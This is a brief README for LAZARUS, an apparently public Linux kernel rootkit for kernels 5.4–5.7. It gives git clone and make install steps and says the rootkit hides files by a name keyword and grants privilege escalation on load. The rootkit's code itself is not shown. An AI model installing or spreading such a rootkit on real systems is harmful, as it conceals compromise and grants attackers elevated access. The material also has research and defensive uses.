						 _____________________

								LAZARUS

						  Claudio Migliorelli
						 _____________________


Table of Contents
_________________

1. Installation
2. Usage


LAZARUS is a rootkit for Linux Kernels 5.4.x-5.7.x that uses debug
facilities to hook transparently system calls.


1 Installation
==============

  ,----
  | git clone https://github.com/migliio/LAZARUS.git
  | cd LAZARUS
  | make
  | make load
  `----


2 Usage
=======

  To hide files, once the module is loaded, create them with
  `lzrs_keyword' inside the files' name. After `make load', /system
  escalation/ is done immediately.
